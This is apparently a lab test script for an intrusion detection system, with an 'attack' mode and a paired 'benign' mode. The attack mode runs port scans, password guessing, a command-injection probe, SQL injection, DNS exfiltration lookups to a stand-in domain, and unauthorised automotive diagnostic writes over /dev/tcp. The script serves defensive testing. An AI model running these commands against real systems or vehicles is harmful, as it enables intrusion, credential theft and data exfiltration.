#!/bin/sh
set -eu

mode=${1:-attack}

if [ "$mode" = "attack" ]; then
  ping -c 4 10.77.0.10 >/dev/null || true
  curl -sS 'http://10.77.0.10/admin?cmd=id' >/dev/null || true
  nmap -n -sS -p 1-30 10.77.0.10 >/evidence/nmap-result.txt

  for password in alpha bravo charlie delta echo foxtrot; do
    credential=$(printf 'analyst:%s' "$password" | base64 | tr -d '\n')
    curl -sS -H "Authorization: Basic $credential" http://10.77.0.10/login >/dev/null || true
  done

  for label in a1b2c3d4e5f6 ffeeddccbbaa 001122334455 deadbeefcafe; do
    dig @10.77.0.53 "$label.exfil.lab" A +tries=1 +time=1 +short >/dev/null || true
  done

  curl -sS --path-as-is \
    'http://10.77.0.10/search?q=1%20UNION%20SELECT%20password' \
    >/dev/null || true

  # ARS_AUTOMOTIVE_FIXTURE: synthetic DoIP diagnostic message (UDS WriteDataByIdentifier)
  printf '\002\375\200\001\000\000\000\007\016\200\020\001\056\361\220' \
    | bash -c 'cat > /dev/tcp/10.77.0.30/13400' || true

  # ARS_AUTOMOTIVE_FIXTURE: synthetic SOME/IP-SD FindService entry
  printf '\377\377\201\000\000\000\000\044\000\000\000\001\001\001\002\000\300\000\000\000\000\000\000\020\000\000\000\000\022\064\377\377\377\000\000\003\377\377\377\377\000\000\000\000' \
    | bash -c 'cat > /dev/udp/10.77.0.30/30490' || true
elif [ "$mode" = "benign" ]; then
  # ARS_BENIGN_FIXTURE: one paired normal transaction per detection scenario.
  ping -c 1 10.77.0.10 >/dev/null || true
  curl -sS 'http://10.77.0.10/admin' >/dev/null || true
  nmap -n -sT -p 80 10.77.0.10 >/dev/null || true
  credential=$(printf 'analyst:approved' | base64 | tr -d '\n')
  curl -sS -H "Authorization: Basic $credential" http://10.77.0.10/login >/dev/null || true
  dig @10.77.0.53 "www.example.lab" A +tries=1 +time=1 +short >/dev/null || true
  curl -sS 'http://10.77.0.10/search?q=service' >/dev/null || true

  # Normal DoIP ReadDataByIdentifier request: service 0x22, not write service 0x2e.
  printf '\002\375\200\001\000\000\000\007\016\200\020\001\042\361\220' \
    | bash -c 'cat > /dev/tcp/10.77.0.30/13400' || true

  # Normal SOME/IP-SD OfferService entry: type 0x01, not FindService type 0x00.
  printf '\377\377\201\000\000\000\000\044\000\000\000\001\001\001\002\000\300\000\000\000\000\000\000\020\001\000\000\000\022\064\377\377\377\000\000\003\377\377\377\377\000\000\000\000' \
    | bash -c 'cat > /dev/udp/10.77.0.30/30490' || true
else
  echo "usage: $0 [attack|benign]" >&2
  exit 2
fi
